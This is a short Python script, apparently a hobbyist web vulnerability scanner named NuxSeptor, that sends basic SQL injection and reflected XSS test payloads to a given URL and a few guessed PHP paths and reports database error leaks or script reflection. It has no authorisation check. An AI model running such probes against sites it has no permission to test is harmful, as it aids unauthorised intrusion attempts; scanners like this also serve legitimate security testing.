import requests
import argparse
import time
import sys
import os
from colorama import Fore, Style, init

init(autoreset=True)
G, R, Y, C, W, M = Fore.GREEN, Fore.RED, Fore.YELLOW, Fore.CYAN, Fore.WHITE, Fore.MAGENTA
BR = Style.BRIGHT

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def nux_banner():
    print(rf"""
{BR}{C}    _   __            {G}_____             __
{BR}{C}   / | / /_  ___  __ {G}/ ___/___  ____  / /_____  _____
{BR}{C}  /  |/ / / / / |/_/ {G}\__ \/ _ \/ __ \/ __/ __ \/ ___/
{BR}{C} / /|  / /_/ />  <  {G}___/ /  __/ /_/ / /_/ /_/ / /
{BR}{C}/_/ |_/\__,_/_/|_| {G}/____/\___/ .___/\__/\____/_/
{BR}{C}                  {G}          /_/
{BR}{W} ──────────────────────────────────────────────────────────
{BR}{W} [CORE] V5.0  | {G}SQLi & XSS HYBRID ENGINE | By dalangvps
{BR}{W} ──────────────────────────────────────────────────────────""")

class NuxElite:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.headers = {"User-Agent": "NuxSeptor-Elite/v5.0"}
        self.vuln_total = 0

        # Payload Tempur
        self.xss_list = ["<script>alert(1)</script>", "javascript:alert(1)"]
        self.sqli_list = ["'", "\"", "';--", "')) OR 1=1--"]

    def log_scan(self, type, url):
        ts = time.strftime("%H:%M:%S")
        # Menampilkan proses scan yang aktif secara real-time
        sys.stdout.write(f"\r{W}[{ts}] {BR}{M}[{type}] {C}Infiltrating: {W}{url[:40]}...")
        sys.stdout.flush()

    def audit(self, url):
        # 1. SQLi Engine (Deep Logic)
        for p in self.sqli_list:
            test_url = f"{url}{'&' if '?' in url else '?'}id={p}"
            self.log_scan("SQLI_SCAN", test_url)
            try:
                r = requests.get(test_url, headers=self.headers, timeout=5)
                # Deteksi via Error Response
                errors = ["sql syntax", "mysql_fetch", "native client", "oracle error", "sqlite3"]
                if any(err in r.text.lower() for err in errors):
                    self.report(test_url, "SQL_INJECTION", "CRITICAL", "Database error leak detected.")
                    break
            except: pass

        # 2. XSS Engine
        for p in self.xss_list:
            test_url = f"{url}{'&' if '?' in url else '?'}search={p}"
            self.log_scan("XSS_SCAN ", test_url)
            try:
                r = requests.get(test_url, headers=self.headers, timeout=5)
                if p in r.text:
                    self.report(test_url, "XSS_REFLECTED", "HIGH", "Script reflection found in DOM.")
                    break
            except: pass

    def report(self, url, type, sev, info):
        self.vuln_total += 1
        print(f"\n\n{BR}{G} WARNING [!]")
        print(f"{W}  > Type     : {type}")
        print(f"{W}  > TARGET   : {C}{url}")
        print(f"{W}  > SEVERITY : {R}{sev}")
        print(f"{W}  > ANALYSIS : {W}{info}\n")

    def run(self):
        clear()
        nux_banner()

        # List lorong yang akan digeledah
        paths = [self.target, self.target+"/search.php", self.target+"/products.php", self.target+"/login.php"]

        print(f"{BR}{W}[*] ANALYZING WEB STRUCTURE...\n")
        for p in paths:
            self.audit(p)
            time.sleep(0.2) # Memberi jeda agar TRACE terlihat nyata

        print(f"\n\n{BR}{G}[FINISH] {W}Audit complete. Found {self.vuln_total} gaps.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", required=True)
    parser.add_argument("--sut", action="store_true")
    args = parser.parse_args()

    if args.sut:
        NuxElite(args.url).run()
    else:
        clear(); nux_banner()
        print(f"{R}[!] Missing --sut to trigger core engine.")